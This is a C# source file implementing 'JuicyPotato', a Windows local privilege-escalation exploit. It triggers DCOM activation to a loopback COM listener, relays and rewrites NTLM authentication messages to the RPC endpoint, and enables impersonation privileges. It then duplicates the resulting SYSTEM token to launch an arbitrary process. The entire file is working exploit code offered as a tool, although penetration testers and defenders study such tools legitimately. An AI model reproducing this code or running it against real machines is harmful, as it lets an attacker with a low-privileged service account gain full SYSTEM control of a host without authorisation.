using System.Diagnostics;
using System.Net;
using System.Text;
using Vanara.InteropServices;
using Vanara.PInvoke;
using static Vanara.PInvoke.Ole32;
using static Vanara.PInvoke.AdvApi32;
using static Vanara.PInvoke.Kernel32;
using static Vanara.PInvoke.Secur32;

namespace sharp_potato;

public class JuicyPotato
{
    public Guid CLSID { get; set; } = Guid.Parse("03ca98d6-ff5d-49b8-abc6-03dd84127020");
    public IPEndPoint ComServerEndPoint { get; set; } = new(IPAddress.Loopback, 1337);
    public IPEndPoint RpcServerEndPoint { get; set; } = new(IPAddress.Loopback, 135);
    public LocalNegotiator Negotiator { get; } = new();
    public ProcessStartInfo ProcessStartInfo { get; set; } = new();

    private Thread comListenerThread;
    private bool newConnection;
    private readonly CancellationTokenSource cancellationTokenSource = new();

    private ComServer comServer;
    private RpcClient rpcClient;

    public JuicyPotato()
    {
        if (Environment.OSVersion.Version.Major > 10 || Environment.OSVersion.Version.Build >= 17763)
            throw new JuicyPotatoException("The JuicyPotato exploit no longer works on Windows 10 1809, Windows Server 2019 or newer builds");
    }

    public void StartCOMListenerThread()
    {
        comListenerThread = new Thread(StartCOMListener);
        comListenerThread.Start();
    }

    private void StartCOMListener()
    {
        comServer = new ComServer(ComServerEndPoint);
        comServer.Start();

        rpcClient = new RpcClient(RpcServerEndPoint);
        rpcClient.Connect();

        while (true)
        {
            var dataRead = comServer.Read();
            if (dataRead == null)
                break;

            dataRead = ProcessNtlmBytes(dataRead);
            rpcClient.ReconnectIfNeeded(ref newConnection);
            rpcClient.Write(dataRead);
            dataRead = rpcClient.Read();
            dataRead = ProcessNtlmBytes(dataRead);
            comServer.Write(dataRead);
            newConnection = comServer.CheckForNewConnections();
        }

        comServer.Stop();
        rpcClient.Close();
    }

    private static int FindNTLMBytes(byte[] data)
    {
        var pattern = new byte[] {0x4E, 0x54, 0x4C, 0x4D, 0x53, 0x53, 0x50};
        int pIdx = 0;
        int i;
        for (i = 0; i < data.Length; i++)
        {
            if (data[i] == pattern[pIdx])
            {
                pIdx += 1;
                if (pIdx == 7) return (i - 6);
            }
            else
            {
                pIdx = 0;
            }
        }

        return -1;
    }

    private byte[] ProcessNtlmBytes(byte[] data)
    {
        int ntlmLoc = FindNTLMBytes(data);
        if (ntlmLoc == -1)
            return data;

        int messageType = data[ntlmLoc + 8];
        switch (messageType)
        {
            case 1: return data[..ntlmLoc].Concat(Negotiator.HandleType1(data[ntlmLoc..])).ToArray();
            case 2: return data[..ntlmLoc].Concat(Negotiator.HandleType2(data[ntlmLoc..])).ToArray();
            case 3: return data[..ntlmLoc].Concat(Negotiator.HandleType3(data[ntlmLoc..])).ToArray();
            default:
                Console.Out.WriteLine("Error - Unknown NTLM message type...");
                return null;
        }
    }

    public void TriggerDCOM()
    {
        CoInitialize(IntPtr.Zero);
        CreateILockBytesOnHGlobal(IntPtr.Zero, true, out var lb);
        StgCreateDocfileOnILockBytes(lb, STGM.STGM_CREATE | STGM.STGM_READWRITE | STGM.STGM_SHARE_EXCLUSIVE, 0, out var stg);

        var t = new StorageTrigger(stg, ComServerEndPoint);

        var tmp = Guid.Parse("00000000-0000-0000-C000-000000000046");
        var qis = new MULTI_QI[]
        {
            new()
            {
                pIID = new GuidPtr(tmp),
                pItf = null,
                hr = 0
            }
        };

        CoGetInstanceFromIStorage(null, CLSID, null, CLSCTX.CLSCTX_LOCAL_SERVER, t, 1, qis);
    }

    public void WaitForAuth()
    {
        while (Negotiator.AuthResult != 0)
            Thread.Sleep(100);
        cancellationTokenSource.Cancel();
    }

    public SafePROCESS_INFORMATION CreateProcess(STARTUPINFO startupInfo)
    {
        if (!OpenProcessToken(GetCurrentProcess(), TokenAccess.TOKEN_ALL_ACCESS, out var hToken))
            return null;

        EnablePrivilege(hToken, "SeImpersonatePrivilege");
        EnablePrivilege(hToken, "SeAssignPrimaryTokenPrivilege");
        OpenProcessToken(GetCurrentProcess(), TokenAccess.TOKEN_ALL_ACCESS, out hToken);
        QuerySecurityContextToken(Negotiator.Context, out var elevatedToken);
        // IsTokenSystem(hToken); // TODO

        DuplicateTokenEx(elevatedToken, TokenAccess.TOKEN_ALL_ACCESS, null,
            SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, TOKEN_TYPE.TokenPrimary, out var dupedToken);

        CREATE_PROCESS flags = 0;
        if (ProcessStartInfo.CreateNoWindow)
            flags |= CREATE_PROCESS.CREATE_NO_WINDOW;

        CreateProcessWithTokenW(dupedToken, 0, ProcessStartInfo.FileName,
            new StringBuilder($"{ProcessStartInfo.FileName} {ProcessStartInfo.Arguments}"),
            flags, null, null, startupInfo, out var processInformation);

        return processInformation;
    }

    private bool EnablePrivilege(SafeHTOKEN token, string privilege)
    {
        if (!LookupPrivilegeValue(null, privilege, out var luid))
        {
            Console.Out.WriteLine("LookupPrivilegeValue failed!");
            return false;
        }

        var tp = new TOKEN_PRIVILEGES();
        tp.PrivilegeCount = 1;
        tp.Privileges = new[] {new LUID_AND_ATTRIBUTES(luid, PrivilegeAttributes.SE_PRIVILEGE_ENABLED)};
        if (!AdjustTokenPrivileges(token, false, tp, out _).Succeeded)
        {
            Console.Out.WriteLine("AdjustTokenPrivileges failed!");
            return false;
        }

        return true;
    }

    private bool IsTokenSystem(SafeHTOKEN token)
    {
        Console.Out.WriteLine("IsTokenSystem");

        var tokenUser = token.GetInfo<TOKEN_USER>(TOKEN_INFORMATION_CLASS.TokenUser);

        Console.Out.WriteLine(tokenUser.User.Sid.GetBinaryForm().Length);

        var sid = tokenUser.User.Sid.GetBinaryForm();

        var userName = new StringBuilder(64);
        var domainName = new StringBuilder(64);

        int userNameSize = 64;
        int domainNameSize = 64;

        LookupAccountSid(null, sid, userName, ref userNameSize, domainName, ref domainNameSize, out _);
        Console.Out.WriteLine($"{domainName}\\{userName}");

        return false;
    }
}